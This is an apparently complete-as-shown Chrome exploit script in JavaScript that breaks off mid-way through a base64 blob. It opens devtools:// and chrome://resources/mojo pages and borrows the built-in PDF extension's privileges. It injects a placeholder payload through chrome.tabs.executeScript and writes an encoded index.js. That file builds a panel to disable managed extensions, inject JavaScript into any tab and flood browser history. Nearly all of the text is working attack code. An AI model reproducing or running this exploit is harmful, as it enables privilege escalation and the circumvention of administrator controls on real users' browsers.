((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PT0gbnVsbCkKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KFtdKSk7CgpBcnJheS5wcm90b3R5cGUucmVtb3ZlID0gZnVuY3Rpb24gKGl0ZW0pIHsKICBpZiAodGhpcy5pbmRleE9mKGl0ZW0pID09PSAtMSkgdGhyb3cgbmV3IEVycm9yKCJub3QgaW4gYXJyYXkiKTsKICB0aGlzLnNwbGljZSh0aGlzLmluZGV4T2YoaXRlbSksIDEpOwp9OwoKLy8gbW9kaWZpZWQgZnJvbSBodHRwczovL2dpdGh1Yi5jb20vbWRuL2RvbS1leGFtcGxlcy90cmVlL21haW4vcG9wb3Zlci1hcGkvdG9hc3QtcG9wb3ZlcnMKZnVuY3Rpb24gbWFrZVRvYXN0KG1zZywgdGltZSkgewogIGNvbnN0IHBvcG92ZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJhcnRpY2xlIik7CiAgcG9wb3Zlci5wb3BvdmVyID0gIm1hbnVhbCI7CiAgcG9wb3Zlci5jbGFzc0xpc3QuYWRkKCJ0b2FzdCIpOwogIHBvcG92ZXIuY2xhc3NMaXN0LmFkZCgibmV3ZXN0Iik7CiAgcG9wb3Zlci50ZXh0Q29udGVudCA9IG1zZzsKICBwb3BvdmVyLnN0eWxlLnRyYW5zbGF0ZSA9ICItNTAlIjsKCiAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwb3BvdmVyKTsKICBwb3BvdmVyLnNob3dQb3BvdmVyKCk7CgogIHNldFRpbWVvdXQoKCkgPT4gewogICAgcG9wb3Zlci5oaWRlUG9wb3ZlcigpOwogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgIHBvcG92ZXIucmVtb3ZlKCk7CiAgICB9LCA1MDApOwogIH0sIHRpbWUgKiAxMDAwKTsKCiAgcG9wb3Zlci5hZGRFdmVudExpc3RlbmVyKCJ0b2dnbGUiLCAoZXZlbnQpID0+IHsKICAgIGlmIChldmVudC5uZXdTdGF0ZSA9PT0gIm9wZW4iKSB7CiAgICAgIG1vdmVUb2FzdHMoKTsKICAgIH0KICB9KTsKfQoKLy8gbW9kaWZpZWQgZnJvbSBodHRwczovL2dpdGh1Yi5jb20vbWRuL2RvbS1leGFtcGxlcy90cmVlL21haW4vcG9wb3Zlci1hcGkvdG9hc3QtcG9wb3ZlcnMgKENDMC0xLjApCmZ1bmN0aW9uIG1vdmVUb2FzdHMoKSB7CiAgY29uc3QgdG9hc3RzID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiLnRvYXN0Iik7CgogIHRvYXN0cy5mb3JFYWNoKCh0b2FzdCkgPT4gewogICAgaWYgKHRvYXN0LmNsYXNzTGlzdC5jb250YWlucygibmV3ZXN0IikpIHsKICAgICAgdG9hc3Quc3R5bGUudG9wID0gYDVweGA7CiAgICAgIHRvYXN0LmNsYXNzTGlzdC5yZW1vdmUoIm5ld2VzdCIpOwogICAgfSBlbHNlIHsKICAgICAgY29uc3QgcHJldlZhbHVlID0gdG9hc3Quc3R5bGUudG9wLnJlcGxhY2UoInB4IiwgIiIpOwogICAgICBjb25zdCBuZXdWYWx1ZSA9IHBhcnNlSW50KHByZXZWYWx1ZSkgKyB0b2FzdC5jbGllbnRIZWlnaHQgKyAxMDsKICAgICAgdG9hc3Quc3R5bGUudG9wID0gYCR7bmV3VmFsdWV9cHhgOwogICAgfQogIH0pOwp9CgpmdW5jdGlvbiBtYWtlRGlhbG9nKHRpdGxlLCBtc2csIG9uY2FuY2VsLCBvbmNvbmZpcm0pIHsKICBjb25zdCBkaWFsb2cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaWFsb2ciKTsKICBjb25zdCBjb25maXJtQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgY29uc3QgY2FuY2VsQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgY29uc3QgaGVhZCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImgxIik7CiAgY29uc3QgYm9keSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGNvbnN0IGZvb3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCiAgLy8gcHV0IGl0IGFsbCB0b2dldGhlcgogIGRpYWxvZy5hcHBlbmRDaGlsZChoZWFkKTsKICBkaWFsb2cuYXBwZW5kQ2hpbGQoYm9keSk7CiAgZGlhbG9nLmFwcGVuZENoaWxkKGZvb3QpOwogIGZvb3QuYXBwZW5kQ2hpbGQoY29uZmlybUJ0bik7CiAgZm9vdC5hcHBlbmRDaGlsZChjYW5jZWxCdG4pOwogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZGlhbG9nKTsKCiAgaGVhZC50ZXh0Q29udGVudCA9IHRpdGxlOwoKICAvLyBzdHlsaW5nCiAgYm9keS5zdHlsZS5vdmVyZmxvd1kgPSAic2Nyb2xsIjsKICBib2R5LnN0eWxlLmNvbG9yID0gInJnYigyMjAgMjIwIDIyMCkiOwogIGJvZHkuc3R5bGUuZm9udFNpemUgPSAiMXJlbSI7CiAgYm9keS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMTBweCI7CiAgYm9keS5zdHlsZS5wYWRkaW5nID0gIjEwcHgiOwogIGJvZHkuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwoKICBpZiAoQXJyYXkuaXNBcnJheShtc2cpKSB7CiAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAycHggIzFkMWQxZCI7CiAgICBtc2cuZm9yRWFjaCgodmFsdWUpID0+IHsKICAgICAgbGV0IGl0ZW0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJwIik7CiAgICAgIGl0ZW0udGV4dENvbnRlbnQgPSB2YWx1ZTsKICAgICAgYm9keS5hcHBlbmRDaGlsZChpdGVtKTsKICAgIH0pOwogIH0gZWxzZSB7CiAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAycHggIzJkMmQyZCI7CiAgICBib2R5LnRleHRDb250ZW50ID0gbXNnOwogIH0KCiAgZm9vdC5zdHlsZS5oZWlnaHQgPSAiZml0LWNvbnRlbnQiOwogIGZvb3Quc3R5bGUubWFyZ2luVG9wID0gImF1dG8iOwogIGZvb3Quc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICBmb290LnN0eWxlLmZsZXhEaXJlY3Rpb24gPSAicm93LXJldmVyc2UiOwoKICAvLyBidXR0b25zCiAgY29uZmlybUJ0bi5jbGFzc0xpc3QuYWRkKCJjb25maXJtQnRuIik7CiAgY29uZmlybUJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgIGRpYWxvZy5jbG9zZSgpOwogICAgb25jb25maXJtKCk7CiAgICBzZXRUaW1lb3V0KCgpID0+IGRpYWxvZy5yZW1vdmUoKSwgMTAwMCk7CiAgfSk7CiAgY29uZmlybUJ0bi50ZXh0Q29udGVudCA9ICJDb25maXJtIjsKCiAgY2FuY2VsQnRuLmNsYXNzTGlzdC5hZGQoImNhbmNlbEJ0biIpOwogIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgIGRpYWxvZy5jbG9zZSgpOwogICAgb25jYW5jZWwoKTsKICAgIHNldFRpbWVvdXQoKCkgPT4gZGlhbG9nLnJlbW92ZSgpLCAxMDAwKTsKICB9KTsKICBjYW5jZWxCdG4udGV4dENvbnRlbnQgPSAiQ2FuY2VsIjsKCiAgZGlhbG9nLnNob3dNb2RhbCgpOwp9Cgphc3luYyBmdW5jdGlvbiBleHRlbnNpb25FeGlzdHMoaWQpIHsKICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+CiAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoKGV4dGVuc2lvbnMpID0+CiAgICAgIHJlc29sdmUoZXh0ZW5zaW9ucy5zb21lKChleHQpID0+IGV4dC5pZCA9PT0gaWQpKQogICAgKQogICk7Cn0KCi8vIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7Ci8vIGNocm9tZS5maWxlTWFuYWdlclByaXZhdGUub3BlblVSTCgpOwovLyB9CmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKPHRpdGxlPlVudGl0bGVkIERvY3VtZW50PC90aXRsZT4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL2RvY3MuaWNvIj4KPGRpdiBpZD0iY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiPgogIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICA8aDE+IGNocm9tZS5tYW5hZ2VtZW50IERpc2FibGUgRXh0ZW5zaW9ucyA8L2gxPgogIDwvZGl2PgoKICA8YnIgLz4KICA8cD5FeHRlbnNpb25zPC9wPgogIDxidXR0b24gaWQ9ImN1cnJlbnQtZXh0ZW5zaW9uIj5EaXNhYmxlIGluamVjdGVkIGV4dGVuc2lvbjwvYnV0dG9uPgogIDxidXR0b24gaWQ9InJtdi1jbW4tYmx0Ij5SZW1vdmUgQmxvYXQ8L2J1dHRvbj4KICA8YnV0dG9uIGlkPSJkaXNhYmxlLXVzZXJkZWYtZXh0cyI+RGlzYWJsZSB1c2VyIGRlZmluZWQgbGlzdCBvZiBleHRlbnNpb25zPC9idXR0b24+CiAgPCEtLSBNb3ZlZCB0YWIgYnV0dG9ucyB0byBkZWZhdWx0IGNhcGFiaWxpdGllcyB3aXRoIGEgY29uZGl0b24gb2YgY2hyb21lLnRhYnMuZXhlY3V0ZXNjcmlwdCAtLT4KICA8YnIgLz48YnIgLz4KICA8dWwgY2xhc3M9ImV4dGxpc3QiPgogIDwvdWw+CiAgPCEtLSA8aW5wdXQgdHlwZT0iIiBjbGFzcz0iZXh0bnVtIiAvPjxidXR0b24gZGlzYWJsZWQgaWQ9InRvZ2dsZXIiPlRvZ2dsZSBleHRlbnNpb248L2J1dHRvbj4KPCEtLSA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImV4dG51bSIgLz48YnV0dG9uIGRpc2FibGVkIGlkPSJ0b2dnbGVyIj5Ub2dnbGUgZXh0ZW5zaW9uPC9idXR0b24+Cjxici8+PGJyLz4gLS0+CiAgPGRpdiBzdHlsZT0iaGVpZ2h0OiA1MHB4Ij48L2Rpdj4KPC9kaXY+CgpgOwpsZXQgc2F2ZWRFeHRMaXN0ID0gW107CmNvbnN0IHNsaWRlcyA9IFtdOwpsZXQgYWN0aXZlU2xpZGVJZHggPSAwOwpjb25zdCBoYW5kbGVDYWxsYmFja3NfID0gW107CmNvbnN0IFdBSVRfRk9SX0ZJTklTSCA9IDE7CnJlcXVlc3RBbmltYXRpb25GcmFtZShmdW5jdGlvbiBhKHQpIHsKICBmb3IgKGNvbnN0IGNiIG9mIGhhbmRsZUNhbGxiYWNrc18pIHsKICAgIGxldCBtOwogICAgaWYgKChtID0gY2IuZi5hcHBseShudWxsLCBbdCAtIGNiLnRdKSkpIHsKICAgICAgaWYgKG0gPT09IDEpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0gZWxzZSB7CiAgICAgICAgaGFuZGxlQ2FsbGJhY2tzXy5zcGxpY2UoaGFuZGxlQ2FsbGJhY2tzXy5pbmRleE9mKGNiKSwgMSk7CiAgICAgIH0KICAgIH0KICB9CiAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKGEpOwp9KTsKY29uc3QgaGFuZGxlSW5BbmltYXRpb25GcmFtZSA9IChjYiwgdGhpeiA9IG51bGwsIGFyZ3MgPSBbXSkgPT4gewogIGhhbmRsZUNhbGxiYWNrc18ucHVzaCh7CiAgICBmOiBjYiwKICAgIHQ6IHBlcmZvcm1hbmNlLm5vdygpLAogIH0pOwp9OwoKLy8gY2xhc3MgRXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKLy8gICBzdGF0aWMgc2V0dXBTbGlkZXMoYWN0aXZlaWR4ID0gMCkgewovLyAgICAgaWYgKGNocm9tZS5tYW5hZ2VtZW50KSB7Ci8vICAgICAgIHNsaWRlcy5wdXNoKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCIpKTsKLy8gICAgIH0KLy8gICAgIHNsaWRlcy5wdXNoKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNleHRfZGVmYXVsdCIpKTsKLy8gICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2xpZGVzLmxlbmd0aDsgaSsrKSB7Ci8vICAgICAgIGlmIChpID09PSBhY3RpdmVpZHgpIHsKLy8gICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7Ci8vICAgICAgIH0gZWxzZSB7Ci8vICAgICAgICAgc2xpZGVzW2ldLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Ci8vICAgICAgIH0KLy8gICAgIH0KLy8gICAgIGFjdGl2ZVNsaWRlSWR4ID0gYWN0aXZlaWR4OwoKLy8gICAgIG9ua2V5ZG93biA9IGZ1bmN0aW9uIChldikgewovLyAgICAgICBpZiAoZXYucmVwZWF0KSByZXR1cm47CgovLyAgICAgICBpZiAodGhpcy5nZXRTZWxlY3Rpb24oKSAmJiB0aGlzLmdldFNlbGVjdGlvbigpLmFuY2hvck5vZGUudGFnTmFtZSkgewovLyAgICAgICAgIHJldHVybjsKLy8gICAgICAgfQovLyAgICAgICBpZiAoZXYua2V5LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoImxlZnQiKSkgewovLyAgICAgICAgIGFjdGl2ZVNsaWRlSWR4LS07Ci8vICAgICAgICAgaWYgKGFjdGl2ZVNsaWRlSWR4IDwgMCkgewovLyAgICAgICAgICAgYWN0aXZlU2xpZGVJZHggKz0gc2xpZGVzLmxlbmd0aDsKLy8gICAgICAgICB9Ci8vICAgICAgICAgYWN0aXZlU2xpZGVJZHggJT0gc2xpZGVzLmxlbmd0aDsKLy8gICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOwovLyAgICAgICB9Ci8vICAgICAgIGlmIChldi5rZXkudG9Mb3dlckNhc2UoKS5pbmNsdWRlcygicmlnaHQiKSkgewovLyAgICAgICAgIGFjdGl2ZVNsaWRlSWR4Kys7Ci8vICAgICAgICAgaWYgKGFjdGl2ZVNsaWRlSWR4IDwgMCkgewovLyAgICAgICAgICAgYWN0aXZlU2xpZGVJZHggKz0gc2xpZGVzLmxlbmd0aDsKLy8gICAgICAgICB9Ci8vICAgICAgICAgYWN0aXZlU2xpZGVJZHggJT0gc2xpZGVzLmxlbmd0aDsKLy8gICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOwovLyAgICAgICB9Ci8vICAgICAgIEV4dGVuc2lvbkNhcGFiaWxpdGllcy5zZXRBY3RpdmVTbGlkZUluZGV4KGFjdGl2ZVNsaWRlSWR4KTsKLy8gICAgIH07Ci8vICAgfQovLyAgIHN0YXRpYyBzZXRBY3RpdmVTbGlkZUluZGV4KGlkeCkgewovLyAgICAgZnVuY3Rpb24gYSh0KSB7Ci8vICAgICAgIGNvbnN0IHNlY29uZHMgPSB0IC8gMTAwMDsKLy8gICAgICAgaWYgKHNlY29uZHMgPj0gMC4yKSB7Ci8vICAgICAgICAgLy8gc2xpZGVzW2ldLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Ci8vICAgICAgICAgcmV0dXJuIHRydWU7Ci8vICAgICAgIH0KLy8gICAgICAgc2xpZGVzW2lkeF0uc3R5bGUub3BhY2l0eSA9IFN0cmluZyhzZWNvbmRzIC8gMC4yKTsKLy8gICAgIH0KLy8gICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2xpZGVzLmxlbmd0aDsgaSsrKSB7Ci8vICAgICAgIGlmIChpID09PSBpZHgpIHsKLy8gICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICIiOwovLyAgICAgICB9IGVsc2UgewovLyAgICAgICAgIGlmIChzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9PT0gImJsb2NrIikgewovLyAgICAgICAgICAgc2xpZGVzW2ldLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKLy8gICAgICAgICAgIGNvbnN0IG0gPSBpOwovLyAgICAgICAgICAgaGFuZGxlSW5BbmltYXRpb25GcmFtZShmdW5jdGlvbiAodCkgewovLyAgICAgICAgICAgICBjb25zdCBzZWNvbmRzID0gdCAvIDEwMDA7Ci8vICAgICAgICAgICAgIGlmICgwLjggLSBzZWNvbmRzIDw9IDApIHsKLy8gICAgICAgICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJub25lIjsKLy8gICAgICAgICAgICAgICBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lKGEpOwovLyAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwovLyAgICAgICAgICAgICB9Ci8vICAgICAgICAgICAgIHNsaWRlc1tpXS5zdHlsZS5vcGFjaXR5ID0gU3RyaW5nKCgwLjIgLSBzZWNvbmRzKSAvIDAuMik7Ci8vICAgICAgICAgICB9KTsKLy8gICAgICAgICB9Ci8vICAgICAgICAgLy8gc2xpZGVzW2ldLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Ci8vICAgICAgIH0KLy8gICAgIH0KLy8gICB9CgovLyAgIGFjdGl2YXRlKCkge30KLy8gfQpjbGFzcyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKICBzdGF0aWMgdGVtcGxhdGUgPSBgCiAgPHRpdGxlPlVudGl0bGVkIERvY3VtZW50PC90aXRsZT4KICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vZG9jcy5pY28iPgogIDxkaXYgaWQ9ImV4dF9kZWZhdWx0Ij4KICAgIDxkaXYgaWQ9ImRlZmF1bHRfZXh0ZW5zaW9uX2NhcGFiaWxpdGllcyI+CiAgICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgPGgxPiBEZWZhdWx0IEV4dGVuc2lvbiBDYXBhYmlsaXRpZXMgPC9oMT4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9InRhYnMtYnV0dG9ucyI+CiAgICAgICAgPHA+T24gdGFiIHVwZGF0ZTwvcD4KICAgICAgICA8ZGl2IGlkPSJ0b2dnbGVhYmxlLWJ1dHRvbnMiPiA8IS0tIGRvIG5vdCBjaGFuZ2UgdGhlc2UgaWRzLCB1c2VkIGluIGJ1dHRvbiBsaXN0ZW5lciAtLT4KICAgICAgICAgIDxidXR0b24gaWQ9ImVydWRhIj5FcnVkYTwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBpZD0iY2hpaSI+Q2hpaTwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBpZD0iYWRibG9jayI+QWRibG9jazwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBpZD0iZWRwdXp6bGUiPkVkcHV6emxlPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGlkPSJpbnZpZGlvdXMiPkZpeCBJbnZpZGlvdXMgKEludmlkaXJlY3QpPC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGlkPSJvdGhlci1idXR0b25zIj4KICAgICAgICA8cD5PdGhlciBzY3JpcHRzPC9wPgogICAgICAgIDxidXR0b24gaWQ9InN3YW1wIj5Td2FtcDwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9InVwZGF0ZSI+VXBkYXRlPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0iaHN0ZmxkIj5IaXN0b3J5IEZsb29kPC9idXR0b24+CiAgICAgIDwvZGl2PgogICAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDE+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgIDx0ZXh0YXJlYSBpZD0iY29kZSIgcGxhY2Vob2xkZXI9IkVudGVyIEphdmFTY3JpcHQgdG8gaW5qZWN0Ij48L3RleHRhcmVhPgogICAgICAgIDwvZGl2PgogICAgICAgIDxidXR0b24gaWQ9ImNvZGUtcnVuIj5SdW48L2J1dHRvbj4KICAgICAgICA8ZGl2IGlkPSJjb2RlLW91dHB1dCI+PC9kaXY+CgogICAgPC9kaXY+CiAgICA8ZGl2IGlkPSJleHRlbnNpb25fdGFic19kZWZhdWx0Ij4KICAgICAgPGJ1dHRvbiBpZD0idGFicmVsb2FkIj5SZWZyZXNoIFRhYnM8L2J1dHRvbj4KICAgICAgPHVsPgoKICAgICAgPC91bD4KICAgICAgPGlucHV0IGlkPSJUYWJVUkxJbnB1dCIgLz4gPGJ1dHRvbiBpZD0iVGFiVVJMU3VibWl0Ij5DcmVhdGU8L2J1dHRvbj4KCiAgICA8L2Rpdj4KICA8L2Rpdj4KICBgOyAvLyBUT0RPOiBGaXggTmF2aWdhdG9yIChGb3Igbm93IEkgcmVtb3ZlZCBpdCkKICB1cGRhdGVUYWJMaXN0KCkgewogICAgaWYgKHRoaXMuZGlzYXJtZWQpIHsKICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmICh0aGlzLnRhYkxpc3RJblByb2dyZXNzKSB7CiAgICAgIC8vIGNvbnNvbGUubG9nKCJJbiBwcm9ncmVzcyB0YWJsaXN0IGJ1aWxkaW5nISIpOwogICAgICByZXR1cm47CiAgICB9CiAgICB0aGlzLnRhYkxpc3RJblByb2dyZXNzID0gdHJ1ZTsKCiAgICBjb25zdCB0YWJsaXN0ID0gZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZXh0ZW5zaW9uX3RhYnNfZGVmYXVsdCB1bCIpOwoKICAgIHRhYmxpc3QuaW5uZXJIVE1MID0gIiI7CiAgICBjb25zdCB0aGl6ID0gdGhpczsKICAgIGNocm9tZS53aW5kb3dzLmdldEFsbChmdW5jdGlvbiAod2luKSB7CiAgICAgIHdpbi5mb3JFYWNoKGZ1bmN0aW9uICh2KSB7CiAgICAgICAgY2hyb21lLnRhYnMucXVlcnkoeyB3aW5kb3dJZDogdi5pZCB9LCBmdW5jdGlvbiAodGFiSW5mb3MpIHsKICAgICAgICAgIHRhYkluZm9zLmZvckVhY2goZnVuY3Rpb24gKGluZm8pIHsKICAgICAgICAgICAgY29uc3QgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgIGRpdi5jbGFzc05hbWUgPSAidGFibGlzdC1pdGVtIjsKICAgICAgICAgICAgZGl2LmlubmVySFRNTCA9IGA8aW1nICR7CiAgICAgICAgICAgICAgY2hyb21lLnRhYnMgJiYgKGluZm8uZmF2SWNvblVybD8ubGVuZ3RoID8/IDApID4gMAogICAgICAgICAgICAgICAgPyBgc3JjPSIke2luZm8uZmF2SWNvblVybH0iYAogICAgICAgICAgICAgICAgOiAiIgogICAgICAgICAgICB9Lz48c3BhbiBjbGFzcz0idGFiLW5hbWUiPiR7aW5mby50aXRsZX0gKCR7aW5mby51cmx9KTwvc3Bhbj5gOwogICAgICAgICAgICBpZiAoY2hyb21lLnNjcmlwdGluZyB8fCBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KSB7CiAgICAgICAgICAgICAgY29uc3QgcnVuQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICAgICAgICAgICAgcnVuQnV0dG9uLnRleHRDb250ZW50ID0gIlJ1biI7CiAgICAgICAgICAgICAgcnVuQnV0dG9uLm9uY2xpY2sgPSAoKSA9PiBydW5Db2RlKHRydWUsIGluZm8uaWQpOwogICAgICAgICAgICAgIGRpdi5hcHBlbmRDaGlsZChydW5CdXR0b24pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIGNvbnN0IG5hdkJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICAvLyBuYXZCdXR0b24uY2xhc3NOYW1lID0gIm5hdmlnYXRlIjsKICAgICAgICAgICAgLy8gbmF2QnV0dG9uLnRleHRDb250ZW50ID0gIk5hdmlnYXRlIjsKICAgICAgICAgICAgY29uc3QgcHJldmlld0J1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICBwcmV2aWV3QnV0dG9uLnRleHRDb250ZW50ID0gIlByZXZpZXciOwoKICAgICAgICAgICAgLy8gbmF2QnV0dG9uLm9uY2xpY2sgPSBmdW5jdGlvbiAoZXYpIHsKICAgICAgICAgICAgLy8gICBjb25zdCBpbnAgPSBkaXYucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKICAgICAgICAgICAgLy8gICBjaHJvbWUudGFicy51cGRhdGUoaW5mby5pZCwgewogICAgICAgICAgICAvLyAgICAgdXJsOiBpbnAudmFsdWUsCiAgICAgICAgICAgIC8vICAgfSk7CiAgICAgICAgICAgIC8vIH07CiAgICAgICAgICAgIHByZXZpZXdCdXR0b24ub25jbGljayA9ICgpID0+IHsKICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IHRydWU7CgogICAgICAgICAgICAgIHRoaXoucHJldmlld2luZyA9IHRydWU7CgogICAgICAgICAgICAgIGNocm9tZS53aW5kb3dzLnVwZGF0ZSgKICAgICAgICAgICAgICAgIGluZm8ud2luZG93SWQsCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIGZvY3VzZWQ6IHRydWUsCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUoaW5mby5pZCwgeyBhY3RpdmU6IHRydWUgfSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICB3aW5kb3cuY3VycmVudFRpbWVvdXQgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uIG0oKSB7CiAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQod2luZG93LmN1cnJlbnRUaW1lb3V0KTsKCiAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5nZXRDdXJyZW50KGZ1bmN0aW9uICh0YWIpIHsKICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKAogICAgICAgICAgICAgICAgICAgIHRhYi53aW5kb3dJZCwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICBmb2N1c2VkOiB0cnVlLAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgI